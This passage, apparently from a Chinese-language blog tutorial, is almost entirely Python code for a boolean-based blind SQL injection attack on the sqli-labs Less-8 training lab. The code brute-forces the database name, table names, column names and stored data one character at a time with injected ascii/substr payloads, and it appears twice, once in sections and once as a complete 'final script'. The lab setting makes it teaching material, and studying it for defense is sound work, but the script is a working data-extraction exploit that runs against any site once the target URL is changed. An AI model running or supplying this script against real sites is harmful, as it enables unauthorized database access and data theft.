class="built_in">len</span>(requests.get(colNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of col:&quot;</span>+<span class="built_in">str</span>(colNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    colNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解列的数量</span></span><br><span class="line"></span><br><span class="line">colNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, colNum):</span><br><span class="line">    colNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        colNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(colNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(colNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of colname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(colNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        colNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    colName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, colNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            colName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(colName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colName_url).text) == normalHtmlLen:</span><br><span class="line">                colName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(colName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    colNames+=colName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;columns: &quot;</span> + colNames)</span><br><span class="line"><span class="comment"># 猜解列名完成</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="第四部分：拿数据"><a href="#第四部分：拿数据" class="headerlink" title="第四部分：拿数据"></a>第四部分：拿数据</h4><p>思路和猜解表名库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拿数据</span></span><br><span class="line">table_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line">column_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的列：&quot;</span>)</span><br><span class="line"><span class="comment">#可选择要查的列</span></span><br><span class="line"></span><br><span class="line">dataNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dataNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot;)=&quot;</span> +<span class="built_in">str</span>(dataNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(dataNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of data:&quot;</span>+<span class="built_in">str</span>(dataNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dataNum += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">dataNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, dataNum):</span><br><span class="line">    dataNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        dataNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(dataNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(dataNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of dataname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(dataNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        dataNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    dataName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dataNameLen+<span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            dataName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (dataName_url)</span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataName_url).text) == normalHtmlLen:</span><br><span class="line"></span><br><span class="line">                dataName += <span class="built_in">chr</span>(y)</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(dataName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    dataNames += dataName + <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;datas: &quot;</span> + dataNames)</span><br></pre></td></tr></table></figure><h3 id="最终脚本"><a href="#最终脚本" class="headerlink" title="最终脚本"></a>最终脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-8/&quot;</span></span><br><span class="line"></span><br><span class="line">normalHtmlLen = <span class="built_in">len</span>(requests.get(url=url+<span class="string">&quot;?id=1&quot;</span>).text)</span><br><span class="line"><span class="comment"># normalHtmlLen是页面为真时的响应头的长度，和它比较来判断页面回显是否为真</span></span><br><span class="line"><span class="comment"># 我们知道当id=1时回显为真</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The len of HTML:&quot;</span>+<span class="built_in">str</span>(normalHtmlLen))   <span class="comment"># 打印响应头长度</span></span><br><span class="line"></span><br><span class="line">dbNameLen = <span class="number">0</span>       <span class="comment"># 响应头长度，初值为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断库名长度</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dbNameLen_url = url + <span class="string">&quot;?id=1&#x27;+and+length(database())=&quot;</span>+<span class="built_in">str</span>(dbNameLen)+<span class="string">&quot;--+&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dbNameLen_url)       <span class="comment"># 每次输出payload</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbNameLen_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The len of dbName:&quot;</span>+<span class="built_in">str</span>(dbNameLen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dbNameLen == <span class="number">30</span>:          </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)       </span><br><span class="line">        <span class="keyword">break</span>                <span class="comment"># 30次判断仍不对则则报错</span></span><br><span class="line">    dbNameLen += <span class="number">1</span></span><br><span class="line">dbName = <span class="string">&quot;&quot;</span>              <span class="comment"># 定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜解库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dbNameLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">        dbName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr(database(),&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1))=&#x27;&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line">        <span class="comment"># 拼接URL,变量是substr的第2个参数,有两处需要拼接的地方</span></span><br><span class="line">        <span class="built_in">print</span>(dbName_url)</span><br><span class="line">        <span class="comment"># 每次拼接完成后看看效果,测试有没有拼接错</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbName_url).text) == normalHtmlLen:</span><br><span class="line">            dbName += <span class="built_in">chr</span>(a)</span><br><span class="line">            <span class="comment"># 将符合的字母填充到预先设计好的空字符串中</span></span><br><span class="line">            <span class="built_in">print</span>(dbName)</span><br><span class="line">            <span class="keyword">break</span><span class="comment"># 结束的是单次的内部循环,不能结束外部循环</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断表名数量、各个表名长度并猜解表名</span></span><br><span class="line">sheNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sheNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=&quot;</span> +<span class="built_in">str</span>(sheNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">    <span class="comment"># COUNT(*) 函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(sheNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of sche:&quot;</span>+<span class="built_in">str</span>(sheNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sheNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解表的数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来是判断表名长度并猜解表名</span></span><br><span class="line">sheNames=<span class="string">&quot;&quot;</span>              <span class="comment"># 最后输出所以表名用，定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, sheNum):</span><br><span class="line">    sheNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sheNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(sheNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">       </span><br><span class="line">        <span class="built_in">print</span>(sheNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of schename&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(sheNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sheNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜解表名        </span></span><br><span class="line">    sheName = <span class="string">&quot;&quot;</span>    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sheNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            sheName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(sheName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheName_url).text) == normalHtmlLen:</span><br><span class="line">                sheName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(sheName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    sheNames+=sheName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;database: &quot;</span>+dbName)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tabales: &quot;</span>+sheNames)</span><br><span class="line"><span class="comment"># 库名表名猜解完成</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解列名</span></span><br><span class="line">database = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的数据库: &quot;</span>)</span><br><span class="line">table_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line"><span class="comment"># 可选择要查的表</span></span><br><span class="line"></span><br><span class="line">colNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    colNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27;)=&quot;</span> +<span class="built_in">str</span>(colNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># COUNT函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(colNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of col:&quot;</span>+<span class="built_in">str</span>(colNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    colNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解列的数量</span></span><br><span class="line"></span><br><span class="line">colNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, colNum):</span><br><span class="line">    colNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        colNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(colNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(colNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of colname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(colNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        colNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    colName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, colNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            colName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(colName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colName_url).text) == normalHtmlLen:</span><br><span class="line">                colName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(colName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    colNames+=colName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;columns: &quot;</span> + colNames)</span><br><span class="line"><span class="comment"># 猜解列名完成</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#拿数据</span></span><br><span class="line">table_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line">column_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的列：&quot;</span>)</span><br><span class="line"><span class="comment">#可选择要查的列</span></span><br><span class="line"></span><br><span class="line">dataNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dataNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot;)=&quot;</span> +<span class="built_in">str</span>(dataNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(dataNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of data:&quot;</span>+<span class="built_in">str</span>(dataNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dataNum += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">dataNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, dataNum):</span><br><span class="line">    dataNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        dataNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(dataNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(dataNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of dataname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(dataNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        dataNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    dataName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dataNameLen+<span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            dataName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span 